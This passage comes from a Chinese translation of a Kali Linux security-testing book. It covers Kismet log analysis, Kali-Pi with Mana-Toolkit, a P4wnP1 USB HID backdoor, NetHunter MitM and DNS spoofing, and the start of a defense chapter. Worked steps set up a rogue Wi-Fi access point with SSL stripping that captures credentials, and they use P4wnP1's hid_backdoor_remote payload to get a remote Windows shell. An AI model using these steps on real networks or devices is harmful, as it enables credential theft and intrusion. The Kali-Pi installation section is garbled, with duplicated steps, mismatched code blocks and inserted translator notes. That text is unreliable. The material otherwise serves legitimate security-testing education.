[SERVER] INFO: Closed nettxt log file 'Kismet-20180731-15-21-18-1.nettxt'
[SERVER] INFO: Closed gpsml log file 'Kismet-20180731-15-21-18-1.gpsxml'
```

退出时，你的 Wi-Fi 网卡可能仍处于监听模式，因此你可能需要手动关闭它：

## ifconfig wlan0 down

你只需要输入 `ifconfig wlan0 up` 即可将其恢复。。

## 分析数据

现在我们花点时间看看我们收集的数据。进入你的根目录。然后使用 `ls Kismet` 列出文件，如下所示：

```
root@kali:-# ls Kismet*
Kismet-20180731-15-21-18-1.alert Kismet-20180731-15-21-18-1.nettxt
Kismet-20180731-15-21-18-1.gpsxml Kismet-20180731-15-21-18-1.netxml
```

有趣的事情从这里开始，所有收集的信息都在这些文件中。

- Alert 包含生成的任何警报数据
- Gpsxml 如果使用了 GPS 源，则包含 GPS 数据
- Nttxt 包含所有收集的数据，并以良好的文本格式输出
- Netxml 包含 XML 格式的所有数据
- Pcapdump 包含整个会话的数据包捕获文件！

现在我们有了所有这些信息，让我们花点时间看看收集到的数据。打开 .pcap 文件在 Wireshark 中查看所有的 Beacon 帧：

## PCAP 分析

| No. | 源 | 长度 |
| :--- | :--- | :--- |
| 191 | D-Link | |
| 193 | D-Link | |
| 195 | D-Link | |
| 196 | D-Link | |
| 197 | D-Link | |
| 200 | D-Link | |
| 202 | D-Link | |
| 204 | D-Link | |
| 216 | D-Link | |
| 436 | D-Link | |
| 677 | D-Link | |
| 679 | D-Link | |
| 681 | D-Link | |
| 731 | D-Link | |
| 830 | D-Link | |
| 859 | D-Link | |
| 861 | D-Link | |
| 865 | D-Link | |

现在我们有了所有这些信息，让我们看看 .pcap 和 .nettxt 文件。

## Kismet 文本分析

文本文件提供了大量的 Wi-Fi 信息，如上所示。

- 1. 当你觉得 Kismet 运行得足够长时，用你喜欢的文本编辑器打开文件，或者使用 `cat`：

## GNU nano 2.9

Kismet (http://www.kismetwireless.net/)

| Network | BSSID |
| :--- | :--- |
| Network 1 | 88:23:A1:63 |
| Manuf | Dlink |
| First | Tue Jul 31 2018 |
| Last | Tue Jul 31 2018 |
| Type | Infrastructure |
| SSID | 88:23:A1:63 |
| Type | Beacon |
| SSID | "d-link" |
| First | Tue Jul 31 2018 |
| Last | Tue Jul 31 2018 |
| Max Rate | 216.7 |
| Beacon | 8 |
| Packets | 92 |
| WPS | No |
| Encryption | WPA+PSK |
| Encryption | WPA+AES-CCM |
| MPA Version | WPA2 |

| Client | MAC |
| :--- | :--- |
| 1 | 1C:30:8A:01:90:72 |
| Manuf | Hewlett-Packard |
| First | Tue Jul 31 2018 |
| Last | Tue Jul 31 2018 |
| Channel | 8 |
| Frequency | 2442 - 28 packets, 30.43 |

花几分钟查看文件。任何隐藏的路由器都应该显示名称以及所有连接客户端的 MAC 地址，如所示。

## 总结

通过运行 Kismet 并分析日志，我们可以了解周围的网络。通过分析，这些日志可以告诉我们客户端是否连接了不应该连接的无线网络，并揭示组织中不应该激活的非法 Wi-Fi 路由器。Kismet 还有许多功能我们没有涵盖。XML 日志可以被其他程序用于创建交互地图或图表。结合 GPS 数据查看日志（未涵盖）有助于发现无线设备的大位置。

在过去的几个章节中，我们涵盖了多种用于测试无线安全的工具。我们查看了路由器，如果固件不是最新版本且没有使用强密码和密钥，它们就可能是脆弱的。




我们讨论了 Aircrack-ng 工具，并查看了几个可以用于测试和攻击无线网络的工具。我们证明了，当无线网络没有得到妥善保护时，黑客可以接管它们并控制你的去向，并且可以从 Wi-Fi 通信中恢复凭据。在下一节中，我们将稍微切换一下，看看如何在树莓派上运行 Kali。

## 资源

- Kismet 文档 - [https://www.kismetwireless.net/documentation.shtml](https://www.kismetwireless.net/documentation.shtml)

# 第 27 章
 树莓派

Kali 并不限于运行在传统的计算机平台上。不可思的 Kali 开发团队付出了巨大努力，将 Kali 造成一个多平台的安全测试框架。在本章和下一章中，我们将学习如何在树莓派上安装 Kali Linux，并使用它进行一些安全测试，同时简要查看在 Android 手机上运行 Kali Linux。本节的章节更多是概述，而不是分步指导的教程。我在我的博客和其他书籍中对这些工具进行了更深入的细节介绍。

树莓派是一种非常便宜的、功能完整的“信用卡”尺寸单板计算机，有多种型号。Pi 具有基于 ARM 的处理器，其为 ARM 编译的专用操作系统也可以在 Pi 上运行。Offensive Security 已经为树莓派创建了一个 Kali Linux 镜像，因此安装一个受限的基础安装非常简单。问题是，它是受限安装，并且在驱动方面存在一些问题。在树莓派上运行 Kali Linux 的更好解决方案是 Re4son 的“Kali-Pi”。在本章中，我们将看到如何在 Pi 3 上安装 Re4son 的 Kali-Pi，并使用 Mana Toolkit 测试无线安全。

# Pi 电源和内存卡

在我们开始之前，让我快速介绍一下树莓派的电源问题。电源适配器通常不随 Pi 提供，对于 Pi 3 B/B+，建议使用 2.5A 电源。如果你使用的适配器提供的电流不足，Pi 将表现异常，尤其是当你插入 USB 设备（如 Wi-Fi 卡）时。我的最佳建议是购买带有电源的树莓派套件（Canakits 是很不错的）。Pi 也不自带必需的 SDHC 内存卡。选择卡时遵循的一个简单规则是：越快越好。我使用几种不同的卡，但通常为 Kali 使用 16GB - 32GB 的卡。有些套件也附带 SDHC 卡。

# 树莓派 3 上 Re4son 的 Kali-Pi

工具作者：Re4son

工具网站：https://whitedome.com.au/re4son/kali-pi/

你可以从官方的 Kali Arm 页面安装 Kali Linux，但安装完成后，你将拥有一个极简安装，并需要安装额外的软件。驱动程序也存在一些问题。如果你想在树莓派上运行 Kali Linux，一种解决方案是 Re4son 的“Sticky Fingers Kali-Pi”。Kali-Pi 运行在树莓派/2/3 上，并开箱即支持触摸屏和蓝牙。如果你关注 Kali 论坛，你可能在任何与树莓派相关的帖子中看到过 Kali-Pi。Kali-Pi 甚至在 Kali.org 网站上被介绍过：

https://www.kali.org/news/kali-drones-ctf-builds-raspberry-pi-craziness-and-more/

Kali-Pi 的预配置镜像已经安装了几个准备好即可使用的工具。这包括“Mana-Toolkit”。Kali-Pi 的作者提供了手动安装说明，但也提供了一个现成的即用预配置镜像下载链接。在本文中，我们将如何在 Pi/3B/B+ 上安装预配置的 Kali-Pi 镜像，并快速介绍使用它来运行恶意 Wi-Fi 攻击平台 Mana-Toolkit。

为了本章你需要：

- 树莓派（推荐 Pi 3B/3B+），带有电源和 32 GB microSD 卡
- Re4son 的 Kali-Pi 软件
- SD 卡写入器

Kali-Pi 旨在用于配合 TFT 屏幕使用，我使用了原始的树莓派 7 英触摸屏。如果你想执行 Wi-Fi 扫描或任何需要将 Wi-Fi 置于监控模式的操作，你可能还会想使用 USB Wi-Fi 适配器。我使用了 TP-Link TL-WN722N。

> 警告：卡上的任何数据在安装期间将被擦除。

# 安装 Kali-Pi

预配置镜像的使用说明包含在作者网站上，因此我将简要介绍安装过程。检查作者网站以获取任何安装更改和最新的安装信息始终是一个好主意。可以在“https://whitedome.com.au/re4son/kali-pi/”找到带有快速安装和手动安装说明的概述。

1. 下载适用于你的 Pi 版本的镜像，完整说明在此处可用：https://whitedome.com.au/re4son/sticky-fingers-kali-pi-pre-installed-image/
2. 解压镜像：
3. 使用 Win32 Disk Imager 将镜像写入 SD 卡 – 确保为你的 SD 选择了正确的驱动器号。
4. 将 SD 卡插入你的 Pi，如有必要，组装你的树莓派外壳。
5. 连接外设、网络线并通电。
6. 使用 Putty 通过 SSH 连接到路由器分配的 IP 地址。
7. 在主机密钥警告处点击“yes”。
8. 如下所示使用 root 身份登录：
```
login as: root
root@192.168.1.1
```
（注：此处原文示例代码块似乎不完整，已按要求保留格式翻译）
```
login as: root
root@192.168.1.1
```
9. 按照下文所示使用 root 登录：
```
login as: root
root@192.168.1.1
```
（注：原文此处存在重复或截断，已严格遵循指令不重复输出原文）
2. 解压镜像：
3. 使用 Win32 Disk Imager 将镜像写入 SD 卡 – 确保为你的 SD 选择了正确的驱动器号。
4. 将 SD 卡插入你的 Pi，如有必要，组装你的树莓派外壳。
5. 连接外设、网络线并通电。
6. 使用 Putty 通过 SSH 连接到路由器分配的 IP 地址。
7. 在主机密钥警告处点击“yes”。
8. 如下所示使用 root 身份登录：
```
login as: root
root@192.168.1.1
```
9. 按照下文所示使用 root 登录：
```
login as: root
root@192.168.1.1
```
10. 在提示时输入“y”重启。
```
login as: root
root@192.168.1.1
```
11. 在 Kali 完成后，通过 SSH 回到。
12. 运行“kali-config” 配置你的 Pi：
```
login as: root
root@192.168.1.1
```
13. 按照提示输入“y”重启 Kali。
```
login as: root
root@192.168.1.1
```
14. 运行完整更新：
```
apt update
apt upgrade
```
15. 最后重启一次并登录桌面。

Kali 软件配置工具 (Kali-config)

| | |
| :--- | :--- |
| A1 扩展文件系统 | 确保 SD 卡空间可用 |
| A2 超扫描 | 如果有黑边，可能需要调整越扫描 |
| A3 内存分配 | 更改 GPU 可用的内存 |
| A4 音频 | 强制通过 HDMI 或 3.5mm 输出音频 |
| A5 分辨率 | 设置屏幕分辨率
| A6 像素倍增 | 启用/禁用 2x 像素映射
| A7 GL 驱动 | 启用/禁用实验性桌面驱动 |

12. 接下来编辑 /home/pi/Kali-Pi/menu 定义你的屏幕尺寸、启用/禁用锁屏和 PIN：

```
GNU nano 2.9.5 /home/pi/Kali-Pi/menu

## 调整这些：
export GENSIZE-3.5    # 屏幕英寸，选项：5.0, 3.5, 2.8
export PLAYOUT-9       # 按钮数量 - 目前支持 9
export KPIN-0           # 设置为“1”强制执行 PIN 认证，或“0”
export KPISMEOUT-2     # 锁屏前的分钟数
export KPIMVER-1      # 设置树莓派版本，“1”
export TFT-4            # 设置为“0”：无 TFT 屏幕，
                        # 设置为“1”：带有外接鼠标的 TFT 屏幕，
                        # 设置为“3”：相对触摸屏，或
                        # 设置为“4”：树莓派 7 寸触摸屏
```
13. 重启你的 Kali Pi。

Kali Pi 和 Mana-Toolkit

在本节中，我们将介绍 Kali Pi 上的 Mana 脚本。正如我们在上一节中看到的，它创建了一个功能完备的热点供目标连接，并执行带有 SSL 剥密的中间人攻击。这意味着我们将获得他们访问的任何网站的副本或输入的任何凭据，即使他们使用的是 HTTPS。为了使此操作成功，我让 Pi 通过网口连接到互联网，并使用我的 TP-Link USB Wi-Fi 适配器作为 Mana 的恶意接入点。




## 重要目录：

- Mana 程序目录：/usr/share/mana-toolkit
- Mana 配置设置：/etc/mana-toolkit/hostapd-mana.conf
- Mana 启动脚本：/usr/share/lib/mana-toolkit/run-mana
- Mana 捕获流量与日志：/var/lib/mana-toolkit

## 运行 Mana

在 Kali Pi 终端中输入以下命令：

```bash
cd /usr/share/mana-toolkit
cd run-mana
```

在该目录下，你将找到多个可以运行的脚本：

```
root@kali-:/usr/share/mana-toolkit/run-mana# ls
fireman-view.sh      start-noupstream-all.sh
start-nat-full.sh    start-noupstream-eap.sh
start-nat-simple.sh start-noupstream-only.sh
```

请查看手册以获取每个脚本功能的完整描述。正如我们在上一章中所做的那，我们将运行 `start-nat-full.sh`。该脚本会创建一个 Wi-Fi 访问点，对任何连接它的客户端执行 SSL 剥离（尝试将 HTTPS 降级为 HTTP）和中间人攻击。它会捕获任何凭据并将其存储在日志文件夹中。启动：

```bash
root@kali-:/usr/share/mana-toolkit/run-mana# ./start-nat-full.sh
```

当前 MAC: (TP-LINK TECHNOLOGIES CO.)
永久 MAC: (TP-LINK TECHNOLOGIES CO.)
新 MAC: 06:0b:a2:91:b8:77
配置文件： /etc/mana-toolkit/hostapd-mana.conf
正在使用硬件地址 00:11:22:33:44:55 且 为 "Internet" 的 wlan0 wlan0 接口启用

应该会出现一个新的开放 Wi-Fi 网络。当有人连接到恶意 AP 时，我们会收到通知；如果他们尝试输入凭据的网页，我们应该会在 Mana-Toolkit 日志中看到它们的副本。任何由 Mana 引起的活动都列在目录文件中：

```bash
root@kali-pi:/usr/share/mana-toolkit/run-mana# cd /var/lib/mana-toolkit
ls
creds.log
connect.log
sslstrip.log
```

通过扫描日志，我发现了：
username=cyberarms@com
password=cyberarms@com

许多网站会警告你某些异常，浏览器无法与主机网络建立加密连接。所以基本上，Mana 的工作原理在 Kali 虚拟机上完全一样，这就是在树莓派上的实现可能性！

## 基础蓝牙扫描

正如文章开头提到的，Kali 自带蓝牙驱动程序。蓝牙设备破解是一个比较高级的话题，我将在以后涵盖，但我们可以进行简单的扫描。运行 "hciconfig" 查看蓝牙接口是否正在运行：

```
root@kali-pi:~# hciconfig
hci0: Type: Primary Bus: UART BD Address: AA:AA:AA:AA:AA MTU: 1024 SCO: 64 UP RUNNING RX bytes: 7777 acl:0 sco:0 events:50 TX bytes: 2746 acl:0 sco:0 commands:49
```

如果它未启动，你可以尝试运行 "hciconfig hci0 up"。`hcitool` 工具是 Linux 内置的蓝牙工具。你可以用它连接设备到 Linux 系统，但我们可以用它进行简单的扫描和识别。查看帮助文件：

hcitool --help

### 基础扫描：

hcitool scan

在这里发现了一个基础蓝牙键盘：

```
root@kali-pi:~# hcitool scan
Scanning...
00:1A:5D:ED:FB:6C      Bluetooth keyboard
```

现在我们有了 MAC 地址，可以进行一些信息收集：

hcitool info <hardware address>

```
root@kali-pi:~# hcitool info 00:1A:5D:ED:FB:6C
Requesting information ...
BD Address: 00:1A:5D:ED:FB:6C
OUI Company: Mobnova Corp.
Device Name: Bluetooth keyboard
LMP Version: 1 (64) LMP Subversion: 0x1060
Manufacturer: Cambridge Silicon Radio (10)
Features page 0: 0x00 0x06 0xd6 0x78 0x18 0x79 0x93
<slot packets> <us-d slot> <encryption> <slot offset>
<timing inquiry> <sniff mode> <RSI>
<channel quality> <u-law slot> <a-law slot> <CVSD>
<power control> <transparent SCO> <broadcast encrypt>
<Enhanced is> <interleaved scan> <interleaved scan>
<with inquiry bit> <u-law> <AFH class slave>
<sniff during> <pause encryption> <AFH cap. master>
AFH class, master: <extended inquiry> <simple pairing>
<encapsulated POW> <err_data report> <non-flush flag> (LSTO)
<inquiry_pow> <inquiry timeout>
Features page 1: 0x00 0x00 0x00 0x00 0x00 0x00
```

你也可以扫描蓝牙低功耗（BLE）设备。

### hcitool lescan

```
root@kali-:~# hcitool lescan
LE Scan ...
ES:   iFi Act
```

噢，就像是那种“Fitbit”类型的运动手环。记住，我们现在并没有在“破解”蓝牙，只是在进行简单的设备扫描。虽然我听说过一个故事，有人运行蓝牙扫描器是为了确认老板是否在自己的区域。显然，他的老板戴着 Apple Watch，而蓝牙扫描器捕捉到了它，所以他基本上知道了老板要来了。





有几个文件需要修改，请仔细遵循说明。安装好 Stretch 后，将内存卡插入你的 Pi，接通电源（靠近边缘的 USB 端口）并启动它。我们进行的是无头启动，因此你不需要显示器或键盘。当设备启动时，你的路由器将为其分配一个 IP 地址。使用该地址连接到设备。

现在我们将安装 P4wnP1：

注意你的 IP 地址，它应该类似于 192.168.1.x。我的地址是 192.168.1.150。

通过 SSH 连接到设备，输入“**ssh pi@ipaddress**”。在 Windows 上，你可以使用 Putty。

使用密码 **Pi 密码：raspberry** 登录用户。

```
Linux raspberrypi 4.14.50+#1122 Tue Jun 19 12:21:21 BST 2018 armv61
The programs included with the Debian GNU/linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set
a new password.
pi@raspberrypi:- $ 
```

按照提示更改 Pi P4wnP1 的密码是一个好主意。

现在我们需要安装 P4wnP1 程序：

- sudo apt-get -y install git
- cd /home/pi
- git clone --recursive https://github.com/mame82/P4wnP1
- cd P4wnP1
- ./install.sh

安装运行需要一些时间：

```
pi@raspberrypi:~$ cd P4wnp1
pi@raspberrypi:~$ ./P4wnp1/install.sh
Testing Internet Connection and name resolution...
[pass] Internet works
Testing if the system runs Raspberry Jessie or Stretch...
[pass] Pi seems to be running Raspberry Jessie or Stretch
Backing up resolv.conf
Installing packages...
Get:1 http://archive.raspberry.py/org/debian stretch InRelease [25.3 kB]
Get:2 http://archive.raspberry.py/org/raspberry stretch InRelease [15.0 kB]
Get:3 http://archive.raspberry.py/org/raspberry stretch/main armhf Packages
```

完成后，你应该会看到类似下面的屏幕：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_379_0.png)

如果你使用 USB 适配器连接键盘，P4wnp1 将进入交互模式。

如果你正在使用 Pi Zero，应该会开启一个 WiFi AP。你也可以使用该 AP 来设置 P4wnp1：
WiFi 名称：P4wnp1
密钥：MaMe82-P4wnp1
SSH 访问：pi@172.24.0.1 (密码: raspberry)
或通过蓝牙 NAP 访问：pi@172.24.0.1 (密码: raspberry)

进入你的安装目录。从那里你可以修改 'setup.cfg' 文件中的设置，
例如有效负载（payload）和语言选择。

如果你正在使用 Pi Zero，尝试一下 HID 后门吧 :-

你现在需要重启 Pi！

在重启 Pi 之前，我们来聊聊发生了什么。注意程序显示 Pi 的 IP 地址已更改为 172.24.0.1，并且它可以作为一个新的 WiFi 路由器被访问，使用 SSID 为 P4wnp1，WiFi 密码为 MaMe82-P4wnp1。当你重启 Pi 时，这些更改将生效。请重启 Pi。

当 Pi 重启后，你将看到一个新的可用的 WiFi 路由器：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_379_1.png)

- 3. 从你的控制计算机连接到此 WiFi 网络。
你现在可以通过新的 IP 地址 172.24.0.1 SSH（或使用 Putty）到 Pi：

```
login: pi
p@172.24.0.1$ password:
Linux WAME2-P4WN1 4.9.0-v1084 Thu Jan 25 17:40:10 GMT 2018 armv6l

The programs included with the Debian GNU/Linux system are free software;
the distribution terms for each program are described in the
individual files in /usr/share/doc/~/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by absolute law.
Last login: Tue Aug 11 19:52:15 2018

sshd enabled the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set
a new password.
p@WMAME2-P4WN1:~ $ 
```

恭喜，你现在拥有了一个功能完备 P4wnP1！

- 4. 设置有效负载 (Payload)：
现在我们只需要设置当 P4wnP1 连接到目标时想要使用的有效负载。这是通过编辑 'setup.cfg' 文件完成的。

进入 P4wnP1 文件夹。

使用 nano 编辑 `setup.cfg` 文件。

阅读 setup 文件，里面有很多有趣的信息。转到文件底部，你会看到可用的负载（Payloads）。默认是 "network only"。只需用 "#" 号注释掉你想要使用的行。

尝试 "hid_backdoor_remote"：
注释掉 "hid_backdoor_remote" 负载：

```
# Payload selection
=====================
#PAYLOAD=network_only.txt
#PAYLOAD=wifi/hid64.txt # WiFi
#PAYLOAD=wifi/hid32.txt # 32bit
#PAYLOAD=wifi/hid64.bit # only
#PAYLOAD=nexmon/karma.txt # Rogue AP in Karma
#PAYLOAD=nexmon/karma_bt.txt # upstream
#PAYLOAD=mouse.txt # HID demo: Shows different ways
#PAYLOAD=mouse_door.txt # Auto reachback version
#PAYLOAD=wifi_connect.txt
```

保存并退出。

然后关闭 Pi，“sudo shutdown now”。

- 5. 现在从你的主电脑断开 Pi，使用第二个 USB 端口将 Pi 连接到目标。

给它几秒钟进行注册和设置：

![](img/37a3b7ef116f9ef991f9e33dd8b348c_381_0.png)

一旦看到 Pi 上的 LED 闪烁三次，就全部设置好了。我们现在可以通过 WiFi 网络连接到 P4wnP1 并访问目标机器！

- 6. 在你的电脑上，连接到 P4wnP1 WiFi 网络。

- 7. 现在，SSH 连接到 Pi (172.24.0.1)，你应该看到一个新的屏幕：

```
Starting P4wnP1 server...

P4wnP1 HID backdoor
Author: MaMe82
Web: https://github.com/mame82/P4wnP1
State: Experimental (maybe forever :-)

Enter "help" for help
Enter "FireStage" to run stage 1 against the current target.
Use "FireStage" to get more details.
```

```
P4wnP1 shell (client not connected) >
```

输入 "help" 查看可用命令：

```
P4wnP1 shell (client not connected) > help

Documented commands (type help <topic>):
CreateProc GetClient KillClient SendKeys FireStage GetKeyboard SetKeyboardLanguage
```

注意它显示 "client not connected"。

让我们运行 "FireStage" 连接目标机器：

```
P4wnP1 shell (client not connected) > FireStage
Starting to type out stage1 to the target...
done. If the client doesn't connect back, check the target
keyboard layout with 'SetKeyboardLanguage'
P4wnP1 shell (client not connected) > Target connected through HID channel
P4wnP1 shell (client connected) > _
```

你可以在目标系统运行几个命令，或者直接输入 "shell" 进入完全远程的10命令提示符：

```
P4wnP1 shell (client connected) > shell
Process with ID 4960 created
Trying to interact with process ID 4960 ...
Microsoft Windows [Version 10.0.17134.112]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Dan>whoami
whoami

whoami
laptop\dan
```

非常棒！一旦 P4wnP1 部署到目标系统，你就可以使用任何具有 SSH 能力的设备来控制它。在渗透期间部署 P4wnP1 然后用手机控制它会有多酷？你可以这样做，这里是我用我的 Android NetHunter 手机控制 P4wnP1 的截图：

```
1) root@kali: ~ 
FireStage! GetKeyboard KillProc SetKeyboardlanguage help
Undocumented commands:
====================
SendBoxScript cd exit lcd 1
pwd pwd state
SendBoxScript download interact lls 1
s~ shell
nPwm1 shell (connected) > shell
Process with ID 104
Trying to interact with process ID 104
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All Rights Reserved.
C:\Users\admin>
```

使用 "exit" 退出 shell，再次使用 "exit" 退出负载，你可以使用 "sudo shutdown now" 关闭 Pi。

## 结论

在本章中，我们学习了如何使用 Raspberry Pi 单板计算机作为安全测试平台。使用 Pi 进行渗透非常流行，现在这些只是你可以使用的工具。。其功能和实惠的价格对伦理黑客和工具开发者来说都是非常有吸引力的。还有其他基于 Pi 的渗透工具也非常有用，我最喜欢的另一个 WarBerryPi。在下一章中，我们将查看如何在 Android 手机上使用 Kali！

## 资源

P4wnP1: The Pi Zero based USB attack Platform - 
https://dantheliotman.com/2017/09/15/p4wnp1-the-pi-zero-based-usb-attack-platform/





## 第 28 章

## Kali NetHunter

**工具作者：** Offensive Security 及其社区
**工具网站：** https://www.kali.org/kali-linux-nethunter/

如果你还没有玩过 NetHunter，它绝对是自切片面包以来最酷的东西之一。NetHunter 是 Kali Linux 渗透测试平台的适配版本，专为智能手机重新设计。自从我在我的 Nexus 5x 手机上安装了 NetHunter 之后，我几乎每天都在使用它。所以，我强烈建议你尝试一下 NetHunter，看看你是否喜欢。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_385_0.png)

Kali NetHunter 是一个针对 Android 的开源移动安全测试平台。本质上，NetHunter 允许道德黑客和渗透测试人员在手机或平板电脑上拥有 Kali Linux 的强大功能。NetHunter 带有全套 Kali Linux 工具。NetHunter 还包含一些额外的基于 Android 的工具，如 "cSploit" 和 "DriveDroid"。最后，由于 NetHunter 是基于 Android 的，你甚至可以安装一些喜喜欢的 Android 工具。

## 为什么使用 Kali NetHunter

NetHunter 为渗透测试平台引入了移动端，是 Kali 工具包的极佳补充。由于其特性，你可以轻松地使用 NetHunter 测试 Wi-Fi 安全性，通过人机接口设备 (HID) 和“Bad USB”攻击进行物理安全测试，甚至可以像使用 Kali 桌面一样使用它测试本地网络安全。所有这些功能都集成在一个手持的、易于使用的包中。当然，不要忘记隐身性因素——当周围每个人都盯着手机时，一个运行 NetHunter 的渗透测试人员将完美地融入其中。

## 注意：

NetHunter 仅在某些设备上运行。请访问 NetHunter 网站查看支持的设备。

本章将是概述类型的章节，而不是手把手的逐步教程指南。你可以几乎像使用完整的 Kali 安装一样使用 NetHunter。不过，在某些情况下，你可能更倾向于使用完整的桌面环境来处理目标，而不是在手机或平板界面上输入所有内容。在本章中，我只想快速向你展示如何使用你的 NetHunter 手机连接到完整的 Kali 桌面安装。

## 使用 NetHunter、cSploit 和 Kali Linux 进行 DNS 欺骗

作为一名渗透测试人员，如果仅拿着智能手机就在目标公司周围走动，并将上网的各个系统重定向到你设置好的、正等待连接的外部 Kali Linux 系统，那将是多么酷。这通过 Kali NetHunter 是可以实现的！

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_387_0.png)

在 Android 手机上使用 Kali NetHunter cSploit，你可以相当容易地对目标系统进行中间人攻击 (MitM)。当然，你可以进行普通的 MitM 类型攻击，但很棒的是，你还可以进行 DNS 欺骗。这允许你将正在上网的系统（无需物理接触目标）重定向到不同的网站。那么，如果那个不同的网站是一个运行着社会工程攻击的 Kali Linux 桌面系统呢？

**简单提醒一下：** 安装 NetHunter 涉及擦除手机、安装新的自定义固件并获取 Root 权限。与修改任何智能手机一样，在此过程中有手机变成“砖”的可能性，让你喜爱的手机变成一个昂贵的杯杯垫。因此，显然，如果你选择安装，风险由你自担。尽管我在安装 NetHunter 时从未遇到过任何问题。

本章将使用三个系统——运行 NetHunter 的智能手机、运行 Windows 10 的测试目标系统，以及我们的 Kali Linux 虚拟机：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_388_0.png)

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_388_1.png)

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_388_2.png)

| Kali NetHunter | 目标系统 | Kali Linux 系统 |
| :--- | :--- | :--- |

好了，话不多说，让我们看看实际操作！

## 使用 Nethunter

当 Nethunter 启动时，它看起来与其他任何 Android 手机一样，除了酷炫的 Kali 启动界面。Kali NetHunter 拥有在常规 Kali Linux 安装中找到的工具。它还为你提供了一个可以从 "Nethunter" 图标访问的菜单系统：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_388_3.png)

这里有很多棒的工具，比如 "HID attacks" —— 这允许你将手机变成 USB 键盘，当手机连接上时，它实际上会在目标系统上输入命令。还有 MITM 框架，允许你进行比本章涵盖的更高级的 MitM 攻击。当然，你还可以运行 Nmap 扫描、启动 Kali 服务以及许多其他功能。不要忘记你在文件系统中本身安装了许多 Kali 工具，所以你可以打开终端提示符并像通常一样运行它们。

## 使用 cSploit 进行 MitM DNS 欺骗

除了 Kali 工具外，NetHunter 还安装了几个对渗透测试非常有帮助的额外工具：cSploit。通过 cSploit，你可以相当容易地对目标系统进行中间人攻击。当然，你可以进行普通的 MitM 类型攻击，但很棒的是，你还可以进行 DNS 欺骗。这允许你将正在上网的系统（无需物理接触目标）重定向到不同的网站。那么，如果那个不同的网站是一个运行着社会工程攻击的 Kali Linux 桌面系统呢？

（注：原文此处有大量重复，翻译时已去重）





防御中间人攻击的最佳方法是保护你的物理网络。对于你的无线网络，请使用强有力的无线安全和复杂的密码，禁用或保护开放且未使用的网络端口，并在可能的情况下对网络进行分段（segment）。DNS 攻击对使用 SSL (TLS) 的网站通常无效，同样，它们对于托管在托管多个网站的服务器上的网站也不有效。如需对 Kali NetHunter 进行深入实战训练，请参阅我的书籍《Security Testing with Kali NetHunter》。

## 防御

## 第 29 章
## 网络防御与总结

在本书中我们花费了大量时间讲解攻击性安全技术。我们将通过对保护网络系统免受此类攻击的简要讨论来结束全文。

我们将简要介绍：

- 补丁与更新
- 防火墙与入侵防御系统 (IPS)
- 杀毒软件/网络安全程序
- 限制服务与用户权限
- 使用脚本拦截程序
- 使用长复杂的密码
- 网络安全监控
- 日志记录
- 用户教育
- 扫描你的网络
- 最后，使用攻击性安全

虽然没有哪个系统可以保证 100% 安全，但通过使用这些技术，我们可以让系统变得更难攻破。

## 补丁与更新

如果可能，请使用最新版本的操作系统。在连接互联网的网络环境中使用过时的操作系统不是一个好主意。如果你在环境中仍在使用 Windows 7（或 XP - 我的天呐！），我强烈建议更新到 Windows 10。Windows 10 已经发布了一段时间，老实说它是一个非常棒的产品。尽管我遇到过系统在安装版本更改更新时出现问题，但总的来说，我认为它是 Windows 较版本之一。

此外，确保你的软件也是最新的。始终确保 Adobe 产品、Java 和内核浏览器定期打补丁，Office 软件也是如此。如果你处于大型企业环境中，永远不要完全信任自动化补丁和更新管理系统。要定期手动检查重要系统。我曾见过多台服务器在自动更新时报错，但补丁管理服务器显示所有服务器均已更新且无错误。

最后，确保你所有设备的硬件固件（尤其是面向互联网的设备：路由器、交换机、NAS、摄像头、嵌入式服务器设备等）都是最新的并定期打了补丁。正如我们在 Shodan 章节看到的，这些设备可以使用 Shodan 等在线搜索引擎被迅速找到。黑客正积极针对这些设备，因此制定更新计划并积极关注关键设备的更新至关重要。

## 防火墙与 IPS

就在几年前，某些 ISP（互联网服务供应商）仍在为小型办公室和家庭用户提供互联网连接，而他们完全不知道需要防火墙。尽管如此，请始终使用防火墙，不要在不使用防火墙的情况下将任何系统接入实时连接。为你的入站互联网连接设置防火墙，并确保每个独立系统都使用软件防火墙。创建入站（Ingress）和出站（Egress）规则策略来监控或控制进出网络的信息。在最简单的层，阻止与不开展业务的国家通信。更高级的系统允许你控制允许进入和网络的数据类型和协议。

使用 Web 应用防火墙（WAF）保护应用程序服务器。尽管这些不能保证你阻止所有针对 Web 应用的恶意攻击。应用程序安全专家强烈建议，即使有 WAF，也要确保你的 Web 应用编写安全并经过了漏洞测试。入侵防御系统（IPS）是非常棒的，当它们用于网络安全监控类型的系统时（见下文主题），效果更好。

## 杀毒软件/网络安全程序

老实说，我对杀毒软件持矛盾态度。虽然它们确实能阻止许多威胁，但在 20 多年的计算机支持中，我也见过它们不断被绕过。任何有决心的现代黑客都会研究你的公司以找出你使用的是哪种杀毒软件。然后他们会定制自己的漏洞代码来绕过该品牌的杀毒。如果他们无法发现你运行的是什么，就会选择一种可以绕过大多数知名杀软的程序。

并非所有的杀毒软件都是平等的。某些 AV/互联网安全程序已经非常擅长阻止基于脚本的威胁，这种威胁似乎非常流行。此外，某些国家由于可能的间谍担忧，禁止了来自某些国家的杀毒软件。做些功课，了解顶尖杀毒软件应对当前威胁的表现如何，然后选择一个最符合你需求的一个。

## 限制服务与权限级别

关闭不需要的系统上的网络服务和协议。服务器的攻击面越小越好。多年来，微软在这方面提供了帮助，更改了服务器产品，使其默认几乎不带功能，根据需要添加服务。此外，尽快让旧服务器下线。很多时候，公司会保持旧服务器在线，以防需要从中获取某些东西，而随着时间的推移，它们被遗忘或未更新。

